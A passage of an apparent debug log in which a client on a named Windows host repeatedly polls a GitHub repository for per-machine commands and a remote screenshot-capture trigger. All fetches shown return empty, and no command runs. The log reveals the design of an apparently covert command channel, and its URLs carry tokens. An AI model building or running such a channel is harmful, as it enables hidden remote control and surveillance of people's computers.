t"}}
+[2026-08-04 03:06:36.358] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:36.359] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:36.359] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:06:37.361] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:06:37.732] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:37.733] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVRRMKPPLEKWSFQDD3KOEISVAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:37.734] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:37.734] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:37.735] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:06:39.737] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:06:40.121] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:40.122] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXAB5UBTWF7YLLNFXDKOEISZAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:40.123] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:40.124] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:40.124] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:06:43.126] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:06:43.495] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:43.496] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWAI7AQS4UQQROGEDDKOEIS7AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:43.497] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:43.498] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:43.499] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:06:43.500] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:06:43.501] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:06:43.502] Processing screenshot config...
+[2026-08-04 03:06:43.503] [TRACE] handle_capture_settings: start
+[2026-08-04 03:06:43.504] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:06:44.047] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:06:44.048] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:06:44.049] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:06:44.049] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:06:44.050] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:06:44.051] Sleeping for 10 seconds...
+[2026-08-04 03:06:54.054] [TRACE] main loop: iteration start
+[2026-08-04 03:06:54.055] 
+--- POLL ITERATION START ---
+[2026-08-04 03:06:54.056] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:06:54.595] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:06:54.969] screenshots/config.json already exists
+[2026-08-04 03:06:55.971] Fetching path list from GitHub...
+[2026-08-04 03:06:55.972] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:06:55.973] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:06:56.509] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:56.510] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVIRLHD3VW57Y7UFILKOEITZAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:56.511] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:56.511] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:56.512] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:06:57.513] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:06:57.890] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:57.891] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQJT3Y4VA65AUSF4JTKOEIT5AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:57.892] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:57.893] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:57.894] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:06:59.896] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:07:00.270] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:00.271] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFT4DZJKSURFRREQLVLKOEIUBAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:00.272] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:00.273] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:00.273] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:07:03.275] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:07:03.637] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:03.638] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWF3G53AL4TZ5RDLMTKOEIUJAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:03.639] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:03.639] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:03.640] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:07:03.640] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:07:03.641] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:07:03.642] Processing screenshot config...
+[2026-08-04 03:07:03.642] [TRACE] handle_capture_settings: start
+[2026-08-04 03:07:03.643] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:07:04.210] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:07:04.211] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:07:04.212] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:07:04.213] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:07:04.214] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:07:04.215] Sleeping for 10 seconds...
+[2026-08-04 03:07:14.218] [TRACE] main loop: iteration start
+[2026-08-04 03:07:14.219] 
+--- POLL ITERATION START ---
+[2026-08-04 03:07:14.220] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:07:14.823] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:07:15.196] screenshots/config.json already exists
+[2026-08-04 03:07:16.199] Fetching path list from GitHub...
+[2026-08-04 03:07:16.200] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:07:16.200] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:07:16.733] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:16.734] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFSBALC63X72627SA3DKOEIVDAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:16.734] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:16.735] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:16.735] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:07:17.737] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:07:18.118] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:18.119] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUMWSUIESGIBGJBAG3KOEIVFAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:18.120] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:18.121] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:18.122] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:07:20.123] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:07:20.495] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:20.495] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFRSD4U7OUNZIMSL4ALKOEIVJAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:20.496] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:20.497] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:20.497] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:07:23.499] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:07:23.871] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:23.872] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWT3GJTNNLSVSDWOCTKOEIVRAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:23.872] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:23.873] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:23.873] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:07:23.874] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:07:23.875] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:07:23.876] Processing screenshot config...
+[2026-08-04 03:07:23.877] [TRACE] handle_capture_settings: start
+[2026-08-04 03:07:23.877] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:07:24.406] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:07:24.407] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:07:24.407] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:07:24.408] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:07:24.409] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:07:24.410] Sleeping for 10 seconds...
+[2026-08-04 03:07:34.413] [TRACE] main loop: iteration start
+[2026-08-04 03:07:34.414] 
+--- POLL ITERATION START ---
+[2026-08-04 03:07:34.414] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:07:35.305] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:07:35.709] screenshots/config.json already exists
+[2026-08-04 03:07:36.712] Fetching path list from GitHub...
+[2026-08-04 03:07:36.714] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:07:36.714] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:07:37.252] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:37.253] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXRXWGTTVNAGMKLFQTKOEIWLAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:37.254] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:37.254] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:37.255] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:07:38.256] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:07:38.620] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:38.621] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFSRYLB3FST6MBV73S3KOEIWNAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:38.622] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:38.623] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:38.623] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:07:40.625] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:07:40.997] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:40.998] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXTT6JQNQD53WM4E23KOEIWTAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:40.999] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:40.999] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:41.000] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:07:44.001] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:07:44.389] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:44.390] [COMMANDS] Response body: 